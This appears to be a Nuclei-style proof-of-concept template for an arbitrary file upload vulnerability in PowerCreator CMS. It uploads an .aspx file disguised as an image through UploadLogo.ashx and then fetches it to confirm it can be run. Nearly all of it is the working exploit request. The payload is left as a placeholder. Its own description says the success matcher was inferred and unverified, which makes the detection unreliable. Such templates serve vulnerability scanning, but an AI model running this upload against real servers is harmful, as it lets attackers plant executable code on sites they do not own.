id: poc-laap5ve3kv6ollg0
info:
  name: PowerCreator CMS UploadLogo存在任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'POST /upload/UploadLogo.ashx?fileName=123.aspx HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36

    Connection: close

    Content-Length: 245

    Content-Disposition: form-data;name="file1";filename="poc.aspx";

    Content-Type: multipart/form-data; boundary=---------------------------20873900192357278038549710136

    Accept-Encoding: gzip, deflate


    -----------------------------20873900192357278038549710136

    Content-Disposition: form-data; name="file"; filename="poc.aspx"

    Content-Type: image/jpeg


    {{payload}}

    -----------------------------20873900192357278038549710136--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /images/logo/123.aspx HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36

    Connection: close

    Accept-Encoding: gzip, deflate'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
